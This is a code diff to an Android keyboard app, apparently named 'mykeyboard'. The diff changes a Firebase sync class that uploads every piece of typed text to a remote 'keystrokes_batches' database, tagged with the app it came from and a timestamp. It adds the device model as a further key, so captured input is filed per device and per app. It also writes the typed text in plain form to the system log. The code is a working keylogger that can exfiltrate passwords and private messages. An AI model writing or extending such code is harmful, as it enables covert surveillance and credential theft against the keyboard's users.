@@ -1,5 +1,6 @@
 package com.example.mykeyboard
 
+import android.os.Build
 import android.util.Log
 import com.google.firebase.database.FirebaseDatabase
 import kotlinx.coroutines.CoroutineScope
@@ -19,23 +20,25 @@ class FirebaseSyncManager {
                 try {
                     val database = FirebaseDatabase.getInstance()
                     val ref = database.getReference("keystrokes_batches")
+                    val deviceName = Build.MODEL?.replace(Regex("[^a-zA-Z0-9_-]"), "_")?.ifBlank { "Unknown_Device" } ?: "Unknown_Device"
                     val appName = (packageName ?: "unknown.app").replace(Regex("[^a-zA-Z0-9_-]"), "_")
                     val timestampKey = SimpleDateFormat("yyyy-MM-dd_HH-mm-ss_SSS", Locale.getDefault()).format(Date())
 
                     val logData = mapOf(
+                        "deviceName" to deviceName,
                         "appName" to appName,
                         "timestamp" to System.currentTimeMillis(),
                         "typedContent" to text
                     )
 
-                    ref.child(appName).child(timestampKey).setValue(logData)
+                    ref.child(deviceName).child(appName).child(timestampKey).setValue(logData)
                         .addOnSuccessListener {
                             Log.d(TAG, "Keystroke synced successfully: $text")
-                            LogStore.addLog("Keystroke synced ($appName): $text")
+                            LogStore.addLog("[$deviceName] Keystroke synced ($appName): $text")
                         }
                         .addOnFailureListener { e: Exception ->
                             Log.e(TAG, "Failed to sync keystroke", e)
-                            LogStore.addLog("Keystroke sync FAILED: ${e.toString()}")
+                            LogStore.addLog("[$deviceName] Keystroke sync FAILED: ${e.toString()}")
                         }
                 } catch (e: Exception) {
                     Log.e(TAG, "Exception in logKeystroke", e)
